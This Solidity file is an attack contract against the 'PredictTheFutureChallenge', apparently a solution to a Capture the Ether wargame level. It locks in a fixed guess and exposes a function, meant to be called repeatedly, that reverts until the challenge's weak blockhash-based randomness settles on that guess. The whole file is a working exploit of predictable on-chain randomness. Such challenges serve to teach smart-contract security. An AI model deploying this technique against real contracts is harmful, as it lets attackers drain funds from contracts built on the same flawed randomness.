// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IPredictTheFutureChallenge {
    function isComplete()external view returns(bool);
    function lockInGuess(uint8)external payable;
    function settle()external;
}

contract Attack{
    IPredictTheFutureChallenge num;
    constructor(IPredictTheFutureChallenge _num){
        num=_num;
    }
    receive() external payable { }
    function attack()external payable{
        require(msg.value == 1 ether);
        //because there are only 10 possible values (0 - 9)
        //we have to choose a number in that range 
        num.lockInGuess{value:msg.value}(7);
    }
    //spam function SolveIt() until completing the challenge
    function SolveIt()external {
        num.settle();
        require(num.isComplete(), "not completed");
    }
}